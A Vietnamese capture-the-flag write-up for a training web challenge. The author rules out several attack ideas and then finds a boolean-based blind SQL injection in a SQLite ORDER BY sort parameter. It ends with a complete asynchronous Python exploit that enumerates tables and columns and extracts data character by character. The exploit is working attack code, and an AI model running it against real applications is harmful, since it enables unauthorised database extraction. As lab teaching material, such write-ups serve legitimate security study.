

---
Tài liệu/Bài báo tham khảo:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md

---


![Pasted image 20261015225919](Attachments/Pasted%20image%2020261015225919.png)

Thêm sự kiện:
![Pasted image 20261015230248](Attachments/Pasted%20image%2020261015230248.png)

Xóa sự kiện:
![Pasted image 20261015230308](Attachments/Pasted%20image%2020261015230308.png)

Các chức năng sorting:
![Pasted image 20261015230335](Attachments/Pasted%20image%2020261015230335.png)

![Pasted image 20261015230348](Attachments/Pasted%20image%2020261015230348.png)

Nếu thành công sẽ gửi một request success thế này:
![Pasted image 20261015230431](Attachments/Pasted%20image%2020261015230431.png)

Mình test chức năng sorting trước thì khi đổi sang key bất kì sẽ báo Error:
![Pasted image 20261015230532](Attachments/Pasted%20image%2020261015230532.png)
Mình dùng SQLMap kiểm tra xem có lỗ hỏng SQL injection ở đây không mà không được:
![Pasted image 20261015231407](Attachments/Pasted%20image%2020261015231407.png)



Mình test chức năng xóa, thấy một điều khá lạ là chuyển sang số 9 vẫn bị xóa event trong khi mình mới chỉ tạo 2 events:
![Pasted image 20261015231725](Attachments/Pasted%20image%2020261015231725.png)


Mình tính test thêm SSTI ở chức năng add, trong lúc cho SSTI chạy thì mình để ý thấy một cái khá hay, là khi mình đổi status thành khác thì các event bị mất đi:
![Pasted image 20261015233908](Attachments/Pasted%20image%2020261015233908.png)
![Pasted image 20261015233920](Attachments/Pasted%20image%2020261015233920.png)


Điều này giúp mình đặt ra nghi vấn có lẽ nào Param này liên quan tới một query SQL? -> Mình test thêm SQL injection ở đây. (Update lúc sau: Ko được)

Trong lúc test SQLi thì mình tự nhiên nảy ra ý tưởng đổi body thành dạng json rồi tìm xem có phương án tấn công kiểu như Prototype Pollution được không nhưng không được:
![Pasted image 20261015234948](Attachments/Pasted%20image%2020261015234948.png)


Nhưng multipart thì vẫn nhận:
![Pasted image 20261015235116](Attachments/Pasted%20image%2020261015235116.png)Mình thử upload file vào nhưng không được gì, nên bỏ qua hướng này.


Mình thử decode cookie xem có gì không mà không thấy gì đặc biệt:
![Pasted image 20261016082949](Attachments/Pasted%20image%2020261016082949.png)
ko có gì :(


Mình thử test tiếp bằng cách gửi một OPTIONS request đến /, mình thấy còn được gửi HEAD requests nữa.
![Pasted image 20261016090011](Attachments/Pasted%20image%2020261016090011.png)

![Pasted image 20261016090015](Attachments/Pasted%20image%2020261016090015.png)

Nhưng cũng chẳng để làm gì ;-;
Thế là mình quay sang dùng Param Miner trong Burp để quét thì phát hiện có 2 header lạ được ẩn đi:
![Pasted image 20261018005252](Attachments/Pasted%20image%2020261018005252.png)
Mình test mãi ko biết 2 header này để làm gì, có vẻ là false positive, quyết định quay về test SQL injection tiếp:

![Pasted image 20261018011823](Attachments/Pasted%20image%2020261018011823.png)

Mình tự nhiên thấy ko bị lỗi 500 khi chèn OR 1=1 ảo thật. Mình đoán nó có gì đó trong /sort rồi.

Yeah và đúng như mình dự đoán, chỗ này có vẻ server đã truyền thẳng:
```
... ORDER BY <key>
```
để làm tính năng sắp xếp theo tên cột.

Mình thử test xem đây là cơ sở dữ liệu gì bằng cách:
![Pasted image 20261020000547](Attachments/Pasted%20image%2020261020000547.png)

![Pasted image 20261020000603](Attachments/Pasted%20image%2020261020000603.png)

Anh em có thể thấy, nếu gửi hàm version() vào thì lỗi còn gửi sqlite_version() lại được -> đây là sqlite.

Mình thử test thêm:
1=1:
![Pasted image 20261020000854](Attachments/Pasted%20image%2020261020000854.png)

1=2:
![Pasted image 20261020000906](Attachments/Pasted%20image%2020261020000906.png)

hehehehe, anh em có thể thấy nếu 1=1 thì TRUE sẽ ở trên đầu, còn 1=2 thì FALSE sẽ ở trên đầu -> SQL injection dạng Boolean-based




Mình viết logic căn bản rồi nhờ AI debug và ko ngờ viết được script khai thác cực nhanh :)) :

```python
import asyncio
import aiohttp
import re

HOST = "https://web-ezzz-c7907f5903b7.training.bksec.vn"

# Giới hạn số request đồng thời — đủ lớn để nhanh, đủ nhỏ để không nghẽn TCP
CONCURRENCY = 80
sem = asyncio.Semaphore(CONCURRENCY)

async def compareTemplate(expr: str, i: int, oper: str, char: str):
	return f"SUBSTRING({expr}, {i}, 1) {oper} '{char}'"

async def test(session: aiohttp.ClientSession, cond: str):
	async with sem:  # FIX: giới hạn concurrency
		key = f'(CASE WHEN {cond} THEN date ELSE title END)'
		async with session.get(f'{HOST}/sort?key={key}') as res:
			html = await res.text()
			first = re.search(r"<tbody>\s*<tr>\s*<td>([^<]+)</td>", html)
			if not first:
				return None
			return first.group(1) == "111 TRUE"

async def createTestEvents(session: aiohttp.ClientSession):
	await session.post(f"{HOST}/add", data={"title": "000 FALSE", "date": "1111-11-11"})
	await session.post(f"{HOST}/add", data={"title": "111 TRUE", "date": "0001-01-01"})

async def find_char(session, expr: str, i: int, charset: str) -> str:
	results = await asyncio.gather(
		*[test(session, await compareTemplate(expr, i, '=', c)) for c in charset]
	)
	for c, ok in zip(charset, results):
		if ok is True:
			return c
	return '?'

async def extract(session, expr: str, charset: str) -> str:
	length = 0
	while await test(session, f"LENGTH({expr}) > {length}"):
		length += 1

	chars = await asyncio.gather(
		*[find_char(session, expr, i, charset) for i in range(1, length + 1)]
	)
	return ''.join(chars)

async def main():
	# FIX: connector có giới hạn hợp lý thay vì limit=0
	connector = aiohttp.TCPConnector(limit=CONCURRENCY * 2, limit_per_host=CONCURRENCY * 2)
	timeout = aiohttp.ClientTimeout(total=30)
	async with aiohttp.ClientSession(connector=connector, timeout=timeout) as s:
		await createTestEvents(s)

		if await test(s, "1=1") == True:  print("[+] 1=1 -> True, Test passed")
		if await test(s, "1=2") == False: print("[+] 1=2 -> False, Test passed")

		charSet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}-,~!@#$%^&*()+=[]:;?/\\|<>.\"' "

		expr_tables = (
			"(SELECT CAST(group_concat(tbl_name, '~') AS TEXT) FROM sqlite_master "
			"WHERE type='table' AND name NOT LIKE 'sqlite_%')"
		)
		tables = await extract(s, expr_tables, charSet)
		print(f"[+] tables = {tables!r}")

		flag_table = next((t for t in tables.split('~') if 'flag' in t.lower()), None)
		if flag_table is None:
			print("[!] Không thấy bảng chứa 'flag'"); return

		expr_cols = (
			f"(SELECT CAST(group_concat(name, '~') AS TEXT) FROM pragma_table_info('{flag_table}'))"
		)
		cols = await extract(s, expr_cols, charSet)
		print(f"[+] columns of {flag_table} = {cols!r}")

		# Đọc cột 'flag' trước (thường chứa flag), rồi các cột còn lại
		col_list = cols.split('~')
		# Sắp xếp để cột 'flag' lên đầu — tránh đọc cột dài vô ích trước
		col_list.sort(key=lambda c: (c.lower() != 'flag', c))

		for col in col_list:
			expr_data = f"(SELECT CAST(group_concat({col}, '~') AS TEXT) FROM {flag_table})"
			val = await extract(s, expr_data, charSet)
			print(f"[+] {flag_table}.{col} = {val!r}")
			if '{' in val and '}' in val:
				print(f"[***] FLAG: {val}")
				return  # FIX: thấy flag thì dừng, khỏi đọc cột khác

if __name__ == '__main__':
	asyncio.run(main())
```
![Pasted image 20261020013748](Attachments/Pasted%20image%2020261020013748.png)